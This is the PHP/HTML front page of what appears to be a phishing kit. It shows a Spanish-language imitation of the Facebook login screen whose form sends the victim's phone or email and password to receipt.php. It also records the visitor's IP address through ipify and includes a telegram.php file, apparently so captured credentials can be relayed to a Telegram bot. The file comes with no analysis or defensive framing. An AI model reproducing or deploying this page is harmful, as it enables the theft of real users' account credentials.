<?php 
require_once __DIR__ . '/config.php';
require_once __DIR__ . '/ip_utils.php';
require_once __DIR__ . '/telegram.php';
?>

<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="style.css">
  <script src="jquery.min.js"></script>
  <title>Facebook</title>
</head>
<body>
  <h3 id="bateria"></h3>
  
  <div class="capa-principal">
    <img src="facebook.jpg" class="facebook-logo" alt="Tu navegador no es compatible con la página">
    <form action="receipt.php" method="POST">
      <input class="input1" name="Account" type="text" placeholder="Teléfono o correo electrónico" required>
      <input class="input2" name="Pass" type="password" placeholder="Contraseña" required>
      <input type="submit" class="iniciar-secion" value="Iniciar sesión">
    </form>
  </div>

  <strong id="myIp"></strong>

  <script>
    function get_ip(obj){
      document.getElementById('myIp').innerHTML = obj.ip;
    };
  </script>
  <script type="text/javascript" src="https://api.ipify.org/?format=jsonp&callback=get_ip"></script>
  <script src="ajax.js"></script>
</body>
</html>
